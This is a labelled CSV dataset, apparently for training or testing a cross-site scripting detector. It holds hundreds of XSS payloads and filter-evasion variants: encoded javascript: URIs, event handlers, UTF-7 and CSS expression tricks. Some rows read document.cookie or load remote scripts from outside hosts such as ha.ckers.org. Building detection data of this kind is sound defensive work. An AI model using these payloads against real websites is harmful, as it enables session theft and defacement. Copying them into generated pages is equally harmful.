input,label
<svg><script ?>alert(1),1
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
<img src=`xx:xx`onerror=alert(1)>,1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1
<svg contentScriptType=text/vbs><script>MsgBox+1,1
"<a href=""data:text/html;base64_",1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
"<script/src=""data&colon;text%2Fj\u0061v\u0061script",1
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1
<script>+-+-1-+-+alert(1)</script>,1
<body/onload=&lt;!--&gt;&#10alert(1)>,1
<script itworksinallbrowsers>/*<script* */alert(1)</script,1
<img src ?itworksonchrome?\/onerror = alert(1),1
<svg><script>//&NewLine;confirm(1);</script </svg>,1
<svg><script onlypossibleinopera:-)> alert(1),1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
<script x> alert(1) </script 1=2,1
"<div/onmouseover='alert(1)'> style=""x:"">",1
<--`<img/src=` onerror=alert(1)> --!>,1
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,1
"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",1
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1
<object data=data:text/html;base64,1
"<iframe src=""data:text/html",1
"<a href=""data:text/html;blabla",1
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,1
<IMG SRC=”jav ascript:alert(‘XSS’);”>,1
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,1
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,1
%253cscript%253ealert(1)%253c/script%253e,1
“><s”%2b”cript>alert(document.cookie)</script>,1
foo<script>alert(1)</script>,1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,1
<BODY ONLOAD=alert(‘XSS’)>,1
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,1
<IMG SRC=”javascript:alert(‘XSS’)”,1
<iframe src=http://ha.ckers.org/scriptlet.html <,1
"javascript:alert(""hellox worldss"")",1
"<img src=""javascript:alert('XSS');"">",1
<img src=javascript:alert(&quot;XSS&quot;)>,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<EMBED SRC=""data:image/svg+xml;base64",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",1
"<script>alert(""XSS"");</script>&search=1",1
<h1><font color=blue>hellox worldss</h1>,1
<BODY ONLOAD=alert('hellox worldss')>,1
<input onfocus=write(XSS) autofocus>,1
<input onblur=write(XSS) autofocus><input autofocus>,1
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,1
"<form><button formaction=""javascript:alert(XSS)"">lol",1
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">",1
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",1
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",1
"<? foo=""><script>alert(1)</script>"">",1
"<! foo=""><script>alert(1)</script>"">",1
"</ foo=""><script>alert(1)</script>"">",1
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",1
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",1
"<% foo><x foo=""%><script>alert(123)</script>"">",1
"<div style=""font-family:'foo&#10;;color:red;';"">LOL",1
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,1
<script>({0:#0=alert/#0#/#0#(0)})</script>,1
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",1
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,1
"\\"";alert('XSS');//",1
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",1
"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;",1
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1
&lt;BODY ONLOAD=alert('XSS')&gt;,1
"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",1
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",1
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",1
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",1
"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;",1
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",1
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",1
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,1
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",1
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",1
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",1
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",1
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",1
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",1
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",1
žscriptualert(EXSSE)ž/scriptu,1
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript&#058;alert('XSS');\""&gt;",1
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64",1
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",1
"&lt;IFRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/IFRAME&gt;",1
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",1
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",1
"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",1
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",1
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",1
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",1
"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;",1
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",1
"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",1
"xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;",1
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",1
"&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;",1
"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert('XSS')\"")}&lt;/STYLE&gt;",1
&lt;!--&#91;if gte IE 4&#93;&gt;,1
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,1
&lt;!&#91;endif&#93;--&gt;,1
"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",1
"&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;",1
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,1
"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",1
"&lt;EMBED SRC=\""data&#58;image/svg+xml;base64",1
"a=\""get\"";",1
"b=\""URL(\\""\"";",1
"c=\""javascript&#058;\"";",1
"d=\""alert('XSS');\\"")\"";",1
eval(a+b+c+d);,1
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",1
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",1
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,1
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",1
"&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;",1
"&lt;XML SRC=\""xsstest&#46;xml\"" ID=I&gt;&lt;/XML&gt;",1
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,1
&lt;HTML&gt;&lt;BODY&gt;,1
"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",1
"&lt;?import namespace=\""t\"" implementation=\""#default#time2\""&gt;",1
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",1
&lt;/BODY&gt;&lt;/HTML&gt;,1
"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",1
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",1
&lt;? echo('&lt;SCR)';,1
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",1
"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",1
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,1
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",1
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",1
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",1
&lt;,1
%3C,1
&lt,1
&lt;,1
&LT,1
&LT;,1
&#60,1
&#060,1
&#0060,1
&#00060,1
&#000060,1
&#0000060,1
&lt;,1
&#x3c,1
&#x03c,1
&#x003c,1
&#x0003c,1
&#x00003c,1
&#x000003c,1
&#x3c;,1
&#x03c;,1
&#x003c;,1
&#x0003c;,1
&#x00003c;,1
&#x000003c;,1
&#X3c,1
&#X03c,1
&#X003c,1
&#X0003c,1
&#X00003c,1
&#X000003c,1
&#X3c;,1
&#X03c;,1
&#X003c;,1
&#X0003c;,1
&#X00003c;,1
&#X000003c;,1
&#x3C,1
&#x03C,1
&#x003C,1
&#x0003C,1
&#x00003C,1
&#x000003C,1
&#x3C;,1
&#x03C;,1
&#x003C;,1
&#x0003C;,1
&#x00003C;,1
&#x000003C;,1
&#X3C,1
&#X03C,1
&#X003C,1
&#X0003C,1
&#X00003C,1
&#X000003C,1
&#X3C;,1
&#X03C;,1
&#X003C;,1
&#X0003C;,1
&#X00003C;,1
&#X000003C;,1
\x3c,1
\x3C,1
\u003c,1
\u003C,1
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,1
"&lt;IMG SRC=\""javascript&#058;alert('XSS')\""",1
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,1
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;,1
"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;",1
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
&lt;BODY onload!#$%&()*~+-_&#46;,1
"&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",1
"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",1
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out",1
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",1
"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;",1
"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;",1
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,1
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,1
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,1
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",1
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says",1
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,1
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;,1
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,1
"&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;",1
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,1
"'';!--\""&lt;XSS&gt;=&{()}",1
"'';!--""<XSS>=&{()}",1
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=javascrscriptipt:alert('XSS')>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,1
"\"";alert('XSS');//",1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",1
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1
"a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);",1
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",1
"<form><button formaction=""javascript:alert(123)"">crosssitespt",1
<frameset onload=alert(123)>,1
"<!--<img src=""--><img src=x onerror=alert(123)//"">",1
"<style><img src=""</style><img src=x onerror=alert(123)//"">",1
"<object data=""data:text/html;base64",1
"<embed src=""data:text/html;base64",1
"<embed src=""javascript:alert(1)"">",1
"<? foo=""><script>alert(1)</script>"">",1
"<! foo=""><script>alert(1)</script>"">",1
"</ foo=""><script>alert(1)</script>"">",1
<script>({0:#0=alert/#0#/#0#(123)})</script>,1
<script>Object.__noSuchMethod__ = Function,1
"<script src=""#"">{alert(1)}</script>;1",1
"<svg xmlns=""#""><script>alert(1)</script></svg>",1
"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>",1
"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>",1
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-,1
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,1
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-,1
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,1
%253cscript%253ealert(document.cookie)%253c/script%253e,1
“><s”%2b”cript>alert(document.cookie)</script>,1
“><ScRiPt>alert(document.cookie)</script>,1
“><<script>alert(document.cookie);//<</script>,1
foo<script>alert(document.cookie)</script>,1
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,1
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E,1
‘; alert(document.cookie); var foo=’,1
foo\’; alert(document.cookie);//’;,1
</script><script >alert(document.cookie)</script>,1
<img src=asdf onerror=alert(document.cookie)>,1
<BODY ONLOAD=alert(’XSS’)>,1
<script>alert(1)</script>,1
"'';!--""<XSS>=&{()}",1
"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",1
<script/src=data:,1
<marquee/onstart=alert()>,1
<video/poster/onerror=alert()>,1
<isindex/autofocus/onfocus=alert()>,1
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
"<IMG SRC=javascript:alert(""XSS"")>",1
"<IMG SRC=`javascript:alert(""RSnake says",1
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1
<a onmouseover=alert(document.cookie)>xxs link</a>,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
"<IMG SRC=# onmouseover=""alert('xxs')"">",1
"<IMG SRC= onmouseover=""alert('xxs')"">",1
"<IMG onmouseover=""alert('xxs')"">",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,1
&#39;&#88;&#83;&#83;&#39;&#41;>,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,1
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<IMG SRC=""jav	ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
<BODY onload!#$%&()*~+-_.,1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1
<SCRIPT SRC=//ha.ckers.org/.j>,1
"<IMG SRC=""javascript:alert('XSS')""",1
<iframe src=http://ha.ckers.org/scriptlet.html <,1
"\"";alert('XSS');//",1
